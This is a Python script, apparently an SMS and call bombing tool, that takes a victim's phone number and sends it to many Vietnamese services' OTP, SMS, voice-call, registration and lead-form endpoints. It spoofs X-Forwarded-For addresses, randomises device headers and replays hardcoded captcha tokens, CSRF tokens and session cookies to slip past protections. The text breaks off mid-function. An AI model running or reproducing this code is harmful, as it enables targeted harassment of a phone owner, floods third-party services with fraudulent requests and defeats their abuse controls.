import requests
import random
import string
import time
import sys
import json
import re
import base64
import hashlib
import uuid
import concurrent.futures
import zlib
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES
from functools import wraps
from Crypto.Util.Padding import pad, unpad
from collections import OrderedDict, defaultdict
from threading import Lock
from datetime import datetime, timedelta
import xml.etree.ElementTree as ET
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def generate_request_id():
    return str(uuid.uuid4())


def generate_random_email(domain="example.com"):
    length = random.randint(5, 10)
    email_name = "".join(
        random.choices(string.ascii_lowercase + string.digits, k=length)
    )
    return f"{email_name}@{domain}"


random_email = generate_random_email()

phone = ""
count = 0

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Sá» lÆ°á»£ng tham sá» khÃ´ng ÄÃºng")
        sys.exit()
    phone = sys.argv[1]
    count = int(sys.argv[2])
    print("Sá» Äiá»n thoáº¡i:", phone)
    print("Sá» láº§n láº·p:", count)


def phonet(phone):
    if phone.startswith("0"):
        return "+84" + phone[1:]
    return phone


ho = ["Nguyá»n", "Tráº§n", "LÃª", "Pháº¡m", "HoÃ ng", "Huá»³nh", "VÅ©", "Äáº·ng"]
ten = ["Tuáº¥n", "Minh", "HÃ¹ng", "Anh", "HoÃ ng", "Äá»©c", "Nam", "PhÃºc"]

NAME = f"{random.choice(ho)} {random.choice(ten)}"
BASE_URL = "https://uudai.seoulcenter.com.vn/cam-on-quy-khach"

USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
]


def get_agent():
    return random.choice(USER_AGENTS)

def random_headers():
    devices = [
        "SM-G998B",
        "SM-F926B",
        "SM-S901B",
        "SM-A536E",
        "SM-M526B",
        "Xiaomi 13 Pro",
        "Xiaomi 14 Ultra",
        "Redmi Note 13 Pro",
        "Redmi K70",
        "POCO X6 Pro",
        "Nubia Neo 5G",
        "Nubia Z60 Ultra",
        "Nubia Red Magic 9 Pro",
        "OPPO Find X7 Ultra",
        "OPPO Reno 11 Pro",
        "OPPO A78",
        "vivo X100 Pro",
        "iQOO 12 Pro",
        "iQOO Neo 9 Pro",
        "iPhone15,2",
        "iPhone15,3",
        "iPhone16,1",
        "iPhone16,2",
        "Pixel 8 Pro",
        "Pixel 7a",
        "M2012K11AG",
        "V2134",
        "CPH2211",
    ]
    android_versions = ["11", "12", "13", "14", "15"]
    device = random.choice(devices)
    return {
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.choice(android_versions)}; {device})",
        "X-Device-ID": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Accept-Language": random.choice(["vi-VN", "en-US"]),
        "Accept-Encoding": "gzip",
    }


def generate_random_string(length):
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


session = requests.Session()


def _log(name, ok, status=None, err=None):
    if ok:
        print(f"[{name}] â Tha={status}")
    else:
        if err:
            print(f"[{name}] â error={err}")
        else:
            print(f"[{name}] â status={status}")





def sou1():
    url = "https://a.ladipage.com/event"
    headers = {
        "Content-Type": "application/json",
        "LADI_CLIENT_ID": "7f71ce3d-47a6-4206-6175-9b609d43c221",
        "LADI_PAGE_VIEW": "5",
        "Referer": f"https://khuyenmai.seoulcenter.com.vn/cam-on-quy-khach?name=Tráº§n%20tuáº¥n&products=&phone={phone}&form_item3458=Combo%20XuÃ¢n%20Thanh%20NhÃ£&spin_turn_left=3&cart_quantity=0",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0",
    }
    data = {
        "event": "PageView",
        "store_id": "5977f59d1abc544991d43c5b",
        "time_zone": 7,
        "domain": "khuyenmai.seoulcenter.com.vn",
        "url": "https://khuyenmai.seoulcenter.com.vn/cam-on-quy-khach?...",
        "ladipage_id": "6985595d7beb82001297bf6c",
        "publish_platform": "LADIPAGEDNS",
        "data": [],
        "tracking_page": True,
    }
    try:
        r = requests.post(url, headers=headers, json=data, timeout=10)

        _log("center", r.status_code < 400, r.status_code)

    except Exception as e:
        _log("center", False, e)


def p():

    headers = {
        "Accept": "application/json",
        "Accept-Language": "vi-VN,vi;",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "MobileMode": "user",
        "Origin": "https://ivie.vn",
        "Referer": "https://ivie.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0",
        "deviceType": "web",
        "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "user": {
            "password": "6172ac2267e793a6c86dfd7a0a348289",
            "telephoneNumber": {"number": phone, "dialingCode": "+84"},
            "role": 1,
        },
        "socialType": 1,
    }
    try:
        r = requests.post(
            "https://api-produce.isofhcare.com/isofhcare/user/register",
            headers=headers,
            json=json_data,

            timeout=24,
        )
        _log("p", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("p", False, err=e)


def call22():
    url = "https://api-vncdn.vuiapp.vn/graphql"
    headers = {
        "Host": "api-vncdn.vuiapp.vn",
        "x-format-money": "json",
        "Accept": "*/*",
        "Accept-Language": "vi-VN",
        "Content-Type": "application/json",
        "x-debug-otp": "true",
        "Connection": "keep-alive",
        "sentry-trace": "16e5f6d1bf6344ee815d5ffb2fb5d8b0-92ec9f5c7d85c9ee",
    }
    headers.update(random_headers())
    json_data = {
        "query": "mutation requestLogin($payload: RequestLoginPayload!) {\n  requestLogin(payload: $payload) {\n    isNew\n    token\n    debug_otp\n    __typename\n  }\n}\n",
        "variables": {
            "payload": {
                "confirmSharingInformation": True,
                "otpLength": 6,
                "phoneNumber": phone,
            }
        },
        "operationName": "requestLogin",
    }
    try:
        response = requests.post(url, headers=headers, json=json_data, timeout=20)
        _log("call22", response.status_code < 400, response.status_code)
    except Exception as e:
        _log("call22", False, err=e)


def king7():
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "app-version": "70814",
        "authorization": "8996e28efe64d52bcea12d5165ebae17",
        "content-type": "application/json",
        "origin": "https://book.heyu.vn",
        "priority": "u=1, i",
        "referer": "https://book.heyu.vn/login",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
    }
    json_data = {
        "phone": phone,
        "regionName": None,
        "nativeVersion": 2027,
        "reqT": 1721580987444,
    }
    try:
        response = requests.post(
            "https://book.heyu.vn/api/sms/send-code",
            headers=headers,
            json=json_data,
            timeout=15,
        )
        _log("king7", response.status_code < 400, response.status_code)
    except Exception as e:
        _log("king7", False, err=e)


def pp():
    headers = {
        "Host": "api.babilala.vn",
        "phone": phone,
        "accept": "*/*",
        "lang": "vi",
        "content-type": "application/x-www-form-urlencoded",
        "x-unity-version": "2019.3.15f1",
        "user-agent": "babilala/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "accept-language": "vi-VN,vi;q=0.9",
    }
    try:
        r = requests.post(
            "https://api.babilala.vn/api/getOtp", headers=headers, timeout=15
        )
        _log("pp", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("pp", False, err=e)


def king8():
    headers_1 = {
        "accept": "*/*",
        "accept-language": "vi",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://pico.vn",
        "priority": "u=1, i",
        "referer": "https://pico.vn/",
        "region-code": "MB",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data_1 = {
        "name": NAME,
        "phone": phone,
        "provinceCode": "92",
        "districtCode": "925",
        "wardCode": "31261",
        "address": "123",
    }
    response_1 = requests.post(
        "https://auth.pico.vn/user/api/auth/register",
        headers=headers_1,
        json=json_data_1,
        timeout=15,
    )
    headers_2 = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi",
        "access": "206f5b6838b4e357e98bf68dbb8cdea5",
        "channel": "b2c",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://pico.vn",
        "party": "ecom",
        "platform": "Desktop",
        "priority": "u=1, i",
        "referer": "https://pico.vn/",
        "region-code": "MB",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "uuid": "cc31d0b5815a483b92f547ab8438da53",
    }
    json_data_2 = {
        "phone": phone,
    }
    response_2 = requests.post(
        "https://auth.pico.vn/user/api/auth/login/request-otp",
        headers=headers_2,
        json=json_data_2,
        timeout=15,
    )


def call1():
    url = "https://api-vncdn.vuiapp.vn/graphql"
    headers = {
        "Host": "api-vncdn.vuiapp.vn",
        "x-format-money": "json",
        "Accept": "*/*",
        "Accept-Language": "vi-VN",
        "Content-Type": "application/json",
        "x-device-id": "D0C7CAB3-6F39-4CF9-952D-4F25AFDD1442",
        "x-debug-otp": "false",
        "Connection": "keep-alive",
        "sentry-trace": "16e5f6d1bf6344ee815d5ffb2fb5d8b0-92ec9f5c7d85c9ee",
    }
    headers.update(random_headers())    
    json_data = {
        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      debug_otp\n      retryAfter\n      __typename\n    }\n    debug_otp\n    __typename\n  }\n}\n",
        "variables": {
            "payload": {
                "otpMethod": "Voice",
                "otpLength": 6,
                "phoneNumber": phone,
            }
        },
        "operationName": "resendAuthenticationOTP",
    }
    response = requests.post(url, headers=headers, json=json_data, timeout=20)
    print("Status:", response.status_code)


def pppp():
    headers = {
        "accept": "application/json",
        "accept-language": "vi",
        "content-type": "application/json",
        "origin": "https://prepedu.com",
        "referer": "https://prepedu.com/",
        "sec-ch-ua": '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0",
        "x-forwarded-for": "171.224.177.243, 172.17.29.253",
        "x-locale": "vi",
    }
    phone_chuyen_doi = phonet(phone)
    try:
        r = requests.post(
            "https://accounts.prep.vn/api/v1/auth/phone-otp/login",
            headers=headers,
            json={"phone": phone_chuyen_doi},
        )
        _log("pppp", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("pppp", False, err=e)


def otp():
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "x-api-st": str(int(time.time() * 1000)),
        "lang-code": "300",
        "x-fingerprints-key": "7215f5f8fe8c0fd954b62940617d2083",
        "Client-Source": "WebH5",
        "Organizer-Id": "1",
    }
    headers.update(random_headers())
    json_data = {
        "phone": phone,
        "channel": "47wn352484jb9o4252uznw2ja21bd547",
        "http_referer": "https://www.google.com/",
        "fbclid": None,
        "google_client_id": "undefined",
        "ck_data": {
            "_gcl_au": "1.1.104668125.1773278960",
            "_gcl_aw": "GCL.1773278960.CjwKCAjwpcTNBhA5EiwAdO1S9nnQrrX368NxDsAat_wgJWYmxTVKx0sVWJNb2sgZcqICDWPnvdp-4RoCGakQAvD_BwE",
            "_gcl_gs": "2.1.k1$i1773278956$u83190603",
        },
        "query_data": {
            "channel_code": "bj484253nw74",
            "oid": "1",
            "gad_source": "1",
            "gad_campaignid": "23571018883",
            "gbraid": "0AAAAAB15QvdRaipbqweYNrTPaPXqvxqqh",
            "gclid": "CjwKCAjwpcTNBhA5EiwAdO1S9nnQrrX368NxDsAat_wgJWYmxTVKx0sVWJNb2sgZcqICDWPnvdp-4RoCGakQAvD_BwE",
        },
        "b": 2,
        "captcha_id": "",
        "image_url": "",
        "captcha_code": "",
        "long": "",
        "lat": "",
        "location_status": 3,
    }
    try:
        r = requests.post(
            "https://lvay.acvn.top/loanapi/webapi/apply_phone_code",
            headers=headers,
            json=json_data,
            timeout=10,
        )
        _log("otp", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("otp", False, err=e)


def otp2():
    try:
        r = requests.get(
            f"https://benhvienthucuc.vn/landing/thank-you/?phone={phone}",
            timeout=10,
        )
        _log("otp2", r.status_code < 400, r.status_code)
        print(f"â Gá»­i thÃ nh cÃ´ng: {phone}")
    except Exception as e:
        _log("otp2", False, err=e)


def otp22():
    NAME = f"{random.choice(ho)} {random.choice(ten)}"
    try:
        r = requests.get(
            f"https://khuyenmai.seoulcenter.com.vn/cam-on-quy-khach?name={NAME}products=&phone={phone}&form_item3458=Combo%20XuÃ¢n%20Thanh%20NhÃ£&spin_turn_left=3&cart_quantity=0",
            timeout=10,
        )
        _log("otp22", r.status_code < 400, r.status_code)
        print(f"â Gá»­i thÃ nh cÃ´ng: {phone} {NAME}")
    except Exception as e:
        _log("otp22", False, err=e)


def otp11():
    try:
        headers = {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json, text/plain, */*",
            "tenant": "root",
            "User-Agent": get_agent(),
            "Accept-Encoding": "gzip, deflate, br",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua-mobile": "?1",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "accept-language": "ar,ar-YE;q=0.9,en-US;q=0.8,en;q=0.7",
        }
        data = {
            "fullname": NAME,
            "phone": phone,
            "email": random_email,
            "nhucauhoc": "CAMBRIDGE â KHÃA LUYá»N Äá» TRÆ¯á»C THI",
        }

        url = "https://hocmai.vn/new-student/"
        r = requests.post(url, headers=headers, data=data, timeout=15)
        _log("otp11", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("otp11", False, err=e)





def sms1():
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN",
        "BrandCode": "ALFRESCOS",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "DNT": "1",
        "DeviceCode": "web",
        "Origin": "https://alfrescos.com.vn",
        "Referer": "https://alfrescos.com.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    }
    json_data = {
        "phoneNumber": phone,
        "secureHash": "fce5248b43f02bcfb034fee211a0fb40",
        "deviceId": "",
        "sendTime": 1772736195644,
        "type": 1,
        "otpType": 2,
    }
    try:
        r = requests.post(
            "https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN",
            headers=headers,
            json=json_data,
        )
        _log("sms1", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("sms1", False, err=e)


def ila():
    NAME = f"{random.choice(ho)} {random.choice(ten)}"
    url = "https://a.ladipage.com/event"
    headers = {
        "Content-Type": "application/json",
        "LADI_CLIENT_ID": "e1a1ba37-a6be-4487-78f8-0922c91300d4",
        "LADI_PAGE_VIEW": "7",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }
    params = {
        "name": NAME,
        "phone": phone,
        "email": "cotenhp2888@gmail.com",
        "branch": "HN: 107 XuÃ¢n La, XuÃ¢n Äá»nh, Báº¯c Tá»« LiÃªm [142]",
        "job_title": "Sinh viÃªn nÄm 3,4 [6]",
        "message": "",
        "brand_id": "1",
        "link_source": "https://khoahoc.ielts-fighter.com/trung-tam-ielts-v4",
        "source": "google_ads",
        "campaign_id": "72",
        "gad_source": "1",
        "gad_campaignid": "21595334625",
        "gbraid": "0AAAAAC4uUsv56SqkiCopada3pmUs3spQP",
        "gclid": "Cj0KCQiA8KTNBhD_ARIsAOvp6DK8fVt0vsu9A5vTtWCG_hdsuzeAaKcLIttHPKzHfjomfaFK0K0AT8QaAjBpEALw_wcB",
        "cart_quantity": "0",
    }
    payload = {
        "event": "PageView",
        "store_id": "5b57f38472976020da8e5611",
        "time_zone": 7,
        "domain": "khoahoc.ielts-fighter.com",
        "url": "https://khoahoc.ielts-fighter.com/thank-you",
        "ladipage_id": "6181320170f24600200bb7c7",
        "publish_platform": "LADIPAGEDNS",
        "data": [],
        "tracking_page": True,
    }
    try:
        r = requests.post(url, headers=headers, params=params, json=payload, timeout=15)
        _log("ila", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("ila", False, err=e)


def doccen():
    try:
        r = requests.post(
            "https://api.doccen.vn/api/auth/sign-up",
            headers={
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "tenant": "root",
                "User-Agent": get_agent(),
                "Accept-Encoding": "gzip, deflate, br",
                "x-requested-with": "XMLHttpRequest",
                "sec-ch-ua-mobile": "?1",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "accept-language": "ar,ar-YE;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            json={"phoneNumber": phone, "password": "carnyc-4hyrsy-Japmoz"},
            timeout=15,
        )
        _log("doccen", r.status_code in (200, 201, 409), r.status_code)
    except Exception as e:
        _log("doccen", False, err=e)


def king():
    headers = {
        "domain": "kingfoodmart",
        "x-ol-thumbnail-height": "250",
        "sec-ch-ua-platform": '"Windows"',
        "Referer": "https://kingfoodmart.com/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "accept": "*/*",
        "x-ol-thumbnail-width": "250",
        "content-type": "application/json",
    }
    json_data = {
        "operationName": "SendOtp",
        "variables": {
            "input": {
                "phone": phone,
                "captchaSignature": "03AFcWeA7R4-UvV29jYoF3u1O6HEmJkrEXrmlWAtiYBCkLpPm7j1iuCsfBmqNUG7wG20lyIoracCakH5Wh-t81xWmzPEiAPwJCq1Xo5gVrj_sjY8RYYYWGZVFP9r-6kTmbXcSbPmNdmcwCvQ72wAyk2tifcqIUCTVoNeZ-P7AE5jninzGJb26Y78pnr09Z7-004vwOEIaz5T_ucBo-Qj7HJUT1nwn80MwGvGgn9g-BWC-vcKEY_LzJTbe90YSsWmONdvB-uxEy3XmoXJjynL0eWfO8dQM0olXkTr9sWl1qUPbdxCV_QcKeG0CBP_GTqoMnDqHFtyrXMkXmb2bjSP4lP_XdBD-SBnvAV2A5caiuXrSv_0taqKYttnmb8PR6wrZY7P0zAyUoyuGxim06Xl2E4gOP9tP1tfD5yU0Lr2gocTB2EVAHTpPXc9OPGo30uObbjHjymZDds_czqWFkbDlTVi9dSX-I1ryMbNykkGzyUExQSDE-VEAKIcdIbVVhGxHFt5PKcV9Jlnqv6gIq_kwfJphNLM_ttJNLUZThY6dTqFy3ziwwxHKewzAcO071UcwXLAMHavsyO4u0AuaFK-CpiAY_6GhrPHTXpESlKCQpOtmw2LAtm1QO0sk3ZyxYaGjavJXC8rIYBolqXB6xjVwaBzpqKvyJ1h0uV2blVpiEPdaUoGLGNy0fGIHC-wiEgxuEsSmmpFV8DThA1n-ffvyElgsAqlmPuxW9sthapibuhGizpZgbREqlYfNNJfilRi9PqAOtJiXfXjmaeFuGDTYcyyEtTcTHg19yOY7gZ6bzoQTKie0xeA-WQLGzIgUG0VX6_v0pm2mbFD6u87SPBONx5FlCvXr59FBPrlS12PEG8xuBcOtL4gSFR8MhxpAtcHLXEFxKz1W9pKG_xMOv9216m11IpNhxxc8ofR7FM_cS4qrRPOA5PIE1LEz7KsSza81f-ChFq8UVRaEvtGwMKGqHboIqtP5Bd--uBkIpKDU3VOeJ2FO88KF6CxunQmtPGOGh4YJgMx6n3ImAXSi1Zy_memFEYudyqYFuJ5EhjsYg8fYrX6KjhpADQLD4jz9g8OtfrlG0QXavgAAOiyK-3EjXNqY-JOuKc5qqyr4AV4x44hJ1YmR32uN_1XW9w7P477UWrA-PGQbxWZEKbS9tvuFX2lo2O2T18c7Ktt-mv73k5k_u5JBfPQYdQHMT2wBSV9duIb5WtGQtoJi5TGhITyNgQ_uMFe0i8gLD-3m13FrztVh9GWPe5Siy8ubdhsry9wAICrrHPkVeAYUI9rUgUnkQZvrzB_2qwBWzBGs8_TRevDWYsYc8lhu4hSM5ArwCYDQZlJ-iyByYp7DfnBNE6zwDfFKzxD78d4Pc4WzndZVr3mlTvqu32uWcDLa2DckqnM-pBqxXGBLhTe3WS-8t1ctyl2WXiw3VAGCsY6etm2Ufg_KVXa40pF_Eke774ttL_5dcgXWPB9JTAfxzE_OimmrTQrOMYzgDtDsrII0p94E4BbMI3yAQEiAh0QqP0tEezz55z2qwMKXyalylVcQNR7TQgneImu2EAQJAjcxABv3_u8ym0DlFbY_ocdNa5GtWI2yAd_wVTVibBqMVIlbrH28B5fEIoGCBoK7XRyHjeDRDCSI3OfEMQqBG9Qz1UBKI_WZLdrKDR2l1pAR5jtdlTaYFtWBnb7dasRYZ1MUIeOvW6KbCK9lSAb7Ie407CQEs8zkv7T6YIbS6Xn2FgnfJRk6aU6Yd0KrQbIEuI2Ug2FI22-JJmlsgzCby-5-IUM6_iVqVVvmVxDwrh6OjBhup0SRWbCEpTZptlVM_RDGw8BwFCqqP9pOLo3X6F2i_w-32al9-QiIMgTukS2XsejS_pp4ZnqpkLsnKLPtwPevDtDjnbvlrUOTHPr_5XlSn6sxikaSVEphx5CNS2Dkg6x0VFHpMvRladiLLNwvbixumLEFN3Tf3VBnjAhMSR0XmriGRaTJ9FZY98Z4RReFo58SYCqmBOcsgQXNkPGfDD79CJKZdroZLn16Z6Zfezqtrk35D92tXgvZYm8Uihc25WA2HT0tcMhCyJhtA1ZOkGscCOcdFiIJoW-Y-emEgQR5zI8O_AKLMQjMDOhxbtV9w7H2SkphDer1Y0jJ78fCWg",
                "method": "ZALO",
            },
        },
        "query": "mutation SendOtp($input: SendOtpInput!) {  sendOtp(input: $input) {    otpTrackingId    __typename  }}",
    }
    try:
        response = requests.post(
            "https://api.onelife.vn/v1/gateway/",
            headers=headers,
            json=json_data,
            timeout=15,
        )
        _log("king", response.status_code < 400, response.status_code)
    except Exception as e:
        _log("king", False, err=e)




def call9():
    url1 = "https://vttl.org/vtl/api/user/appCollectUpload"
    url2 = "https://vttl.org/vtl/api/user/sentSms"
    extra = random_headers()
    headers_1 = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "vttl.org",
        "language": "vi_VN",
        "osVersion": "2.3.0",
        "User-Agent": "okhttp/4.12.0",
        "X-Device-ID": extra["X-Device-ID"],
        "X-Forwarded-For": extra["X-Forwarded-For"],
    }

    body1 = {
        "72677_appVersion": "2.3.0",
        "e7297_phone": phone,
        "5b4fa_type": "2",
        "40e23_detailed_type": "10",
        "fa4c2_productName": "vtl_trung_m",
    }

    headers_2 = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "vttl.org",
        "language": "vi_VN",
        "osVersion": "2.3.0",
        "User-Agent": "okhttp/4.12.0",
        "X-Device-ID": extra["X-Device-ID"],
        "X-Forwarded-For": extra["X-Forwarded-For"],
    }

    body2 = {
        "277f4_phone": phone,
        "e7755_smsType": 1,
        "b3f6c_type": "1",
        "5d250_loanProductName": "vtl_trung_m",
    }

    try:
        r_1 = requests.post(url1, headers=headers_1, json=body1, timeout=15)
        r_2 = requests.post(url2, headers=headers_2, json=body2, timeout=15)

        _log("call9", r_1.status_code < 400, r_1.status_code)
        _log("call9", r_2.status_code < 400, r_2.status_code)

    except Exception as e:
        _log("call9", False, err=e)


def vtsolution():
    cookies = {
        "ASP.NET_SessionId": "vo5etyjajtiy4ib2faw3znee",
        "Abp.Localization.CultureName": "vi",
        "__RequestVerificationToken": "0hb73fa4s9Aj0qDa5IGId09GuYCWZeXlNPtoEDHulaAhBnPSRIdgFK06D_87fHUUQjHndL8HWX817jTdiIBxNrKG7J6qaN4rR2tkcJzKmNI1",
        "XSRF-TOKEN": "zsAVl679RDMkWA0uDzuBL99OhxLdDbkd7j9JYrxrtJ484edCs9yGQqQyKsaSvvZsC4DNWrY4ZWLvvBA8EGAZ9UOWZNIhxnI0XjXZENRC3Jw1",
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://gpp.com.vn",
        "referer": "https://gpp.com.vn/",
        "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
        "x-xsrf-token": "zsAVl679RDMkWA0uDzuBL99OhxLdDbkd7j9JYrxrtJ484edCs9yGQqQyKsaSvvZsC4DNWrY4ZWLvvBA8EGAZ9UOWZNIhxnI0XjXZENRC3Jw1",
    }
    try:
        r = requests.post(
            "https://gpp.com.vn/account/LayMaXacThucDangKyTaiKhoan",
            cookies=cookies,
            headers=headers,
            json={"soDienThoai": phone},
        )
        _log("vtsolution", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("vtsolution", False, err=e)


def king1():
    headers = {
        "accept": "*/*",
        "accept-language": "vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6",
        "authorization": "",
        "content-type": "application/json",
        "domain": "kingfoodmart",
        "origin": "https://kingfoodmart.com",
        "priority": "u=1, i",
        "referer": "https://kingfoodmart.com/",
        "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }
    json_data = {
        "operationName": "SendOtp",
        "variables": {
            "input": {
                "phone": phone,
                "captchaSignature": "HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD",
            },
        },
        "query": "mutation SendOtp($input: SendOtpInput!) {  sendOtp(input: $input) {    otpTrackingId    __typename  }}",
    }
    try:
        response = requests.post(
            "https://api.onelife.vn/v1/gateway/",
            headers=headers,
            json=json_data,
            timeout=15,
        )
        _log("king1", response.status_code < 400, response.status_code)
    except Exception as e:
        _log("king1", False, err=e)


def doccen1():
    try:
        r = requests.post(
            "https://api.doccen.vn/api/auth/forgot-password",
            headers={
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "tenant": "root",
